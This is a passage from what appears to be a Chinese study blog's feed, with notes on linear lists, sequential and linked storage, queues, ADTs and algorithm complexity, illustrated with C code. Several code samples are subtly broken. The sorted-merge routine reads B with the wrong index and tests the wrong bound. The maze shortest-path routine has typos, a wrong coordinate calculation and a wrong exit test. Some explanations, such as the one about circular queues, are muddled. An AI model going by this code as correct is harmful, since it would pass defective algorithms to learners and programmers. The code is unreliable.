class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span>ElemSet<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">}</span>数据关系<span class="token punctuation">:</span> R1<span class="token operator">=</span><span class="token punctuation">{</span>i<span class="token number">-1</span><span class="token punctuation">,</span>ai<span class="token operator">></span><span class="token operator">|</span> ai<span class="token number">-1</span><span class="token punctuation">,</span><span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span> D<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">}</span>基本操作：<span class="token function">InitList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">//初始化</span><span class="token function">DestroyList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//删除</span><span class="token function">ListInsert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//插入</span><span class="token function">ListDelete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//删除指定元素</span><span class="token punctuation">}</span>ADT List</code></pre><p>线性表有两种存储结构：</p><p> &nbsp; &nbsp; &nbsp; ①定长的顺序存储结构——向量型的一维数组结构</p><p> &nbsp; &nbsp; &nbsp; ②变长的线性表存储结构——链接式存储结构，动态数组，顺序文件</p><h3 id="线性表的顺序存储以及运算实现"><a href="#线性表的顺序存储以及运算实现" class="headerlink" title="线性表的顺序存储以及运算实现"></a>线性表的顺序存储以及运算实现</h3><p> &nbsp; &nbsp; &nbsp; 众人皆知的数组，其实就是以顺序结构存储数据的线性表。</p><blockquote><p> 顺序表示例图：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/09/5bbbfe6d21e6a.png" alt=""><br></div><blockquote><p>顺序表结构算法：</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 20           </span><span class="token comment" spellcheck="true">// 顺序表的最大存储容量</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 顺序表存储的数据类型</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    datatype data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//线性表存储数据</span>    <span class="token keyword">int</span> Last<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//线性表的长度</span><span class="token punctuation">}</span>SeqList<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义一个顺序表 SeqList L;</span><span class="token comment" spellcheck="true">//定义一个SeqList类型的指针 SeqList *L;</span>SeqList <span class="token operator">*</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//初始化线性表</span>    SeqList <span class="token operator">*</span>L<span class="token punctuation">;</span>    L <span class="token operator">=</span> <span class="token punctuation">(</span>SeqList <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SeqList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    L<span class="token operator">-></span>Last<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> L<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    SeqList <span class="token operator">*</span>L <span class="token operator">=</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        L<span class="token operator">-></span>Last <span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前顺序表的长度为 %d，顺序表的大小为 %d"</span><span class="token punctuation">,</span>L<span class="token operator">-></span>Last<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>L<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p> &nbsp; &nbsp; &nbsp; 顺序表应用举例：有顺序表A，B，其元素均按从小到大的升序排列，编写一个算法将他们合并成一个顺序表C，要求C的元素也是从小到大的升序排列。</p><p> &nbsp; &nbsp; &nbsp; 算法思路：依次扫描A和B中的元素，比较当前元素的值，将较小值的元素赋给C，直到一个线性表扫描完毕之后将未完的那个顺序表中余下的那部分赋给C，且C的容量需要能够容纳A,B两个线性表相加的长度，<strong>算法如下</strong>：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span>SeqList A<span class="token punctuation">,</span>SeqList B<span class="token punctuation">,</span>SeqList <span class="token operator">*</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    C<span class="token operator">-></span>last<span class="token operator">=</span>k<span class="token number">-1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>顺序表的优缺点：</p><p>线性表的顺序存储结构，在存、读取数据时，不管是在哪个位置，时间复杂度都是O(1)。而在插入或者删除时，时间复杂度都是O(n)。</p><p>这也就是线性表的顺序存储结构比较适合存取数据，不适合经常插入和删除数据的应用。</p><p>优点：</p><p>1.无需为了表示表中元素之间的逻辑关系而增加额外的存储空间（相对于链式存储而言）。</p><p>2.可以快速的存取表中任意位置的元素。</p><p>缺点：</p><p>1.插入和删除操作需要移动大量的元素。</p><p>2.当线性表长度变化较大时，难以确定存储空间的容量。</p><p>3.容易造成存储空间的“碎片”(因为线性表的顺序存储结构申请的内存空间都以连续的，如果因为某些操作（比如删除操作）导致某个部分出现了一小块的不连续内存空间，因为这一小块内存空间太小不能够再次被利用/分配，那么就造成了内存浪费，也就是“碎片”)</p><p>参考 <a href="https://www.cnblogs.com/wsnb/p/5191518.html" target="_blank" rel="noopener">https://www.cnblogs.com/wsnb/p/5191518.html</a></p></blockquote><h3 id="线性表的链式存储和运算实现"><a href="#线性表的链式存储和运算实现" class="headerlink" title="线性表的链式存储和运算实现"></a>线性表的链式存储和运算实现</h3><p> &nbsp; &nbsp; &nbsp; 顺序表最大的缺点是移动数据元素需要耗费许多时间，影响操作效率。正是因为顺序表的特性，相邻两元素之间的数据存在相邻的关系，使得插入删除的操作麻烦了许多。</p><p> &nbsp; &nbsp; &nbsp; 而链式存储方法不需要用地址连续的存储单元来实现，从而可以使得逻辑相邻的两数据元素在物理上不相邻，但有优点就有缺点，链式存储方法不能进行随机存取。</p><p> &nbsp; &nbsp; &nbsp; 而链表又有单链表，循环链表，双向链表，静态链表的区别。</p><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><blockquote><p>队列是一种操作受限的线性数据结构，与栈后进先出(LIFO)的数据结构截然不同的是队列是一种“先进先出”（FIFO）的数据结构。将这种插入在表一端进行，而删除在表另一端进行的数据结构称为队列（Queue)，并允许插入的一端为队尾（Rear），允许删除的一端为队首（Front）。</p><p><img src="https://i.loli.net/2018/10/16/5bc53818b751c.png" alt=""></p><p>队列的抽象数据类型如下：</p><pre><code>ADT Queue{数据对象：D={ai|ai∈ElemSet, i=1,2, …,n, n≥0}数据关系：R1={&lt;ai-1,ai&gt;|ai-1,ai∈D, i=1,2, …,n }            约定a1为队列头，an为队列尾。基本操作：    InitQueue( &amp;Q ):      操作结果：构造一个空队列Q。    DestroyQueue ( &amp;Q ):      初始条件：队列Q已存在。      操作结果：销毁队列Q。    ClearQueue ( &amp;Q ):      初始条件：队列Q已存在。      操作结果：将Q清为空队列。    QueueEmpty( Q ):      初始条件：队列Q已存在。      操作结果：若Q为空队列，则返回TRUE，否则返回FALSE。    QueueLength( Q ):      初始条件：队列Q已存在。      操作结果：返回Q的数据元素个数，即队列的长度。    GetHead( Q, &amp;e ):      初始条件：队列Q已存在且非空。      操作结果：用e返回Q的队头元素。    EnQueue( &amp;Q, e ):      初始条件：队列Q已存在。      操作结果：插入元素e为Q的新的队尾元素。    DeQueue( &amp;Q, &amp;e ):      初始条件：队列Q已存在且非空。      操作结果：删除Q的队头元素，并用e返回其值。}ADT Queue</code></pre></blockquote><h3 id="基于队列的算法设计实例"><a href="#基于队列的算法设计实例" class="headerlink" title="基于队列的算法设计实例"></a>基于队列的算法设计实例</h3><blockquote><p>​    求迷宫的最短路径：现要求设计一个算法找一条从迷宫入口到出口的最短路径。</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//队的定义</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//记录坐标</span>    <span class="token keyword">int</span> pre<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//pre作为前驱点在sq中的坐标</span><span class="token punctuation">}</span>sqtype<span class="token punctuation">;</span>sqtype sq<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义头尾</span><span class="token comment" spellcheck="true">//算法如下：</span><span class="token keyword">void</span> <span class="token function">path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>move<span class="token punctuation">)</span>    <span class="token keyword">int</span> maze<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//迷宫数组</span>    item move<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//坐标增量数组</span><span class="token punctuation">{</span>    sqtype sq<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>v<span class="token punctuation">;</span>    front <span class="token operator">=</span> rear <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>sql<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    maze<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>front<span class="token operator">&lt;=</span>rear<span class="token punctuation">)</span><span class="token punctuation">{</span>        x <span class="token operator">=</span> sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>y<span class="token operator">=</span>sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>v<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>v<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>v<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//探测八个方向的路径</span>            i <span class="token operator">=</span> x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span> j<span class="token operator">=</span>x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                rear<span class="token operator">++</span><span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> i<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token operator">=</span>j<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span>front<span class="token punctuation">;</span>                maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//走过的路置-1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>m<span class="token operator">&amp;&amp;</span>j<span class="token operator">==</span>m<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printpath</span><span class="token punctuation">(</span>sq<span class="token punctuation">,</span>rear<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打印迷宫</span>                  <span class="token function">restore</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//恢复迷宫，此处未写该函数</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        front<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    retrun <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//打印迷宫的函数</span><span class="token keyword">void</span> <span class="token function">printpath</span><span class="token punctuation">(</span>sqtype sq<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> rear<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    i <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%d,%d)&lt;--"</span><span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">=</span> sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://i.loli.net/2018/10/16/5bc543e6329ce.png" alt=""></p><p>​    循环队列是队列的一种，就像一个首尾相连的贪吃蛇，一直转圈，超过一定长度，就会吃到自己的尾巴。    </p><p>​    如果有需要使用存储信息的队列，不建议使用循环队列，因为循环队列一旦超出定义的大小，就会对之前存储的信息发生覆盖（发生假溢出）。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构和算法-day1</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="数据结构和算法-（Algorithm）-绪论"><a href="#数据结构和算法-（Algorithm）-绪论" class="headerlink" title="数据结构和算法 （Algorithm）- 绪论"></a>数据结构和算法 （Algorithm）- 绪论</h1><h2 id="数据是个啥？"><a href="#数据是个啥？" class="headerlink" title="数据是个啥？"></a>数据是个啥？</h2><p> &nbsp; &nbsp; &nbsp; 数据（data）是信息的载体，是对客观事物的符号化表示，它的含义极为广泛，包含了人们日穿生活中的各种信息在计算机内的表示，而<strong>数据元素</strong>则是数据的基本单位。</p><p><img src="http://photo.orsoon.com/JPG-180515/180515_42/k5oFKYNsQz_small.jpg" alt=""></p><h2 id="数据结构定义"><a href="#数据结构定义" class="headerlink" title="数据结构定义"></a>数据结构定义</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据结构分为逻辑结构和物理结构，以及数据运算三方面内容，一起来愉快地学习它吧😭！</p><h3 id="逻辑结构中几种结构的基本定义"><a href="#逻辑结构中几种结构的基本定义" class="headerlink" title="逻辑结构中几种结构的基本定义"></a>逻辑结构中几种结构的基本定义</h3><p>① 线性结构(1:1)：结构中的数据元素之间存在着一对一的关系，如表，栈，队列等。</p><p>② 树形结构(1:n)：结构中的数据元素之间存在着一对多的关系。</p><p>③ 图形结构(m:n)：结构中的数据元素之间存在着多对多的关系，图形结构也被称为网状结构。</p><p>④ 集合结构：集合结构中的数据元素之间的关系仅仅是”属于同一个集合”，这种结构中的元素关系极为松散，该结构较为少见。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 总体来说，根据数据元素之间存在的不同关系，数据结构可分为<strong>线性结构和非线性结构😱</strong>。</p><p><img src="https://i.loli.net/2018/10/07/5bb97795e5dd5.png" alt=""></p><h3 id="数据结构中的物理结构"><a href="#数据结构中的物理结构" class="headerlink" title="数据结构中的物理结构"></a>数据结构中的物理结构</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据的逻辑结构和数据的存储无关，对数据的操作主要依赖数据的存储，而数据在计算机中的存储表示即数据的存储结构可分为<strong>顺序存储</strong>和<strong>非顺序存储</strong>，但针对一些特殊应用，还有<strong>索引存储结构，散列存储（hash方法）结构</strong>等其他表示方法。</p><p>① <strong>顺序存储方法</strong>：把逻辑上相邻的数据元素储存在物理位置上也相邻的存储单元中，例如数组即是顺序存储方法。</p><p>② <strong>链式存储方法</strong>：逻辑上相邻的数组元素不要求其在物理位置上也相邻，通过附设的指针字段值来指示数据的逻辑关系，算法中的指针就是由链式存储结构实现的。</p><p>③ 索引存储方法：除建立存储结点信息外，还建立附加的索引表来标识结点的地址，索引表由若干索引项组成。 <strong>Dense Index（稠密索引）</strong>代表每个数据元素在索引表中均有一个索引项。<strong>Sparse Index（稀疏索引）</strong>，代表一个索引项对应一组数据元素，<a href="https://www.cnblogs.com/FreeFire/p/4329528.html" target="_blank" rel="noopener">参考链接</a>。</p><p>④ 散列存储方法（Hash方法）：散列是数组存储方式的一种发展，相比数组，散列的数据访问速度要高于数组，因为可以依据存储数据的部分内容找到数据在数组中的存储位置，进而能够快速实现数据的访问，理想的散列访问速度是非常迅速的，而不像在数组中的遍历过程，采用存储数组中内容的部分元素作为映射函数的输入，映射函数的输出就是存储数据的位置，这样的访问速度就省去了遍历数组的实现，因此<strong>时间复杂度可以认为为O(1)</strong>，而<strong>数组遍历的时间复杂度为O(n)</strong>，<a href="https://baike.baidu.com/item/%E6%95%A3%E5%88%97%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95/9663463?fr=aladdin" target="_blank" rel="noopener">参考链接</a>。</p><h2 id="抽象数据类型（Abstract-Data-Type，ADT）"><a href="#抽象数据类型（Abstract-Data-Type，ADT）" class="headerlink" title="抽象数据类型（Abstract Data Type，ADT）"></a>抽象数据类型（Abstract Data Type，ADT）</h2><p> &nbsp; &nbsp; &nbsp; ADT 的定义：一个数学模型以及定义在该模型上的一组操作。描述数据结构的一种理论工具。</p><pre class=" language-bash"><code class="language-bash">ADT 抽象数据类型名称 <span class="token punctuation">{</span>数据对象：<span class="token operator">&lt;</span>数据对象定义<span class="token operator">></span>……数据关系：<span class="token operator">&lt;</span>逻辑关系定义<span class="token operator">></span>……操作集合：  操作名1：  <span class="token operator">&lt;</span>基本操作1初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作1操作结果描述<span class="token operator">></span>  ……  ……  操作名n：  <span class="token operator">&lt;</span>基本操作n初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作n操作结果描述<span class="token operator">></span><span class="token punctuation">}</span>ADT抽象数据类型名称</code></pre><p> &nbsp; &nbsp; &nbsp; ADT 的作用：抽象数据类型可以使我们更容易描述现实世界。例：用线性表描述学生成绩表，用树或图描述遗传关系。<strong>优点是拥有较强的重复性，灵活性，封装性。</strong></p><p> &nbsp; &nbsp; &nbsp; ADT 的关键特征：使用它的人可以只关心它的逻辑特征，不需要了解它的存储方式。定义它的人同样不必要关心它如何存储。</p><p> &nbsp; &nbsp; &nbsp; 例如：线性表这样的抽象数据类型，其数学模型是：<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">数据元素</a>的集合，该集合内的元素有这样的关系：除第一个和最后一个外，每个元素有唯一的前趋和唯一的后继。可以有这样一些操作：插入一个元素、删除一个元素等。</p><p> &nbsp; &nbsp; &nbsp; <strong>从抽象数据类型的角度看，数据结构是ADT的物理实现。</strong></p><h2 id="算法的复杂度"><a href="#算法的复杂度" class="headerlink" title="算法的复杂度"></a>算法的复杂度</h2><p> &nbsp; &nbsp; &nbsp; 算法的复杂度通常分为时间复杂度，空间复杂度，采用<strong>“大O表示法”</strong>定义算法效率度量。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> &nbsp; &nbsp; &nbsp; 判定算法性能的一个基本考虑是处理一定<strong>“规模（Size）”</strong>的输入时，该算法所需执行的<strong>“基本操作数（Basic Operation）”。</strong></p><p> &nbsp; &nbsp; &nbsp; T(N) = O(f(N))是指保证函数T(N)以不快于f(N)速度增长；f(N)是一个上界（upper bound），即某个算法的增长率最差情况是f(N)，给出几个例子：</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//1.算法时间复杂度为 O(1),称为常量阶</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2.算法时间复杂度为 O(n),称为线性阶</span><span class="token number">3</span><span class="token punctuation">.</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token operator">++</span>x<span class="token punctuation">;</span>        s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//3.算法时间复杂度为 O(n*n),称为平方阶</span><span class="token number">4</span><span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span> i<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//4.算法时间复杂度为 O(log2n),称为对数阶</span><span class="token comment" spellcheck="true">//根据基本执行次数，运用极限的方法来计算复杂度</span></code></pre><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p> &nbsp; &nbsp; &nbsp; 一个程序的空间复杂度是指从程序运行到结束所需的存储量。而程序的存储空间分为固定部分和可变部分，就像电脑分了硬盘存储空间和内存存储空间一样😄，程序本身所占的物理空间加上程序运行时所需要的内存组成了程序运行所需的存储空间。</p><p>Try to get the best answer！</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/</url>
      
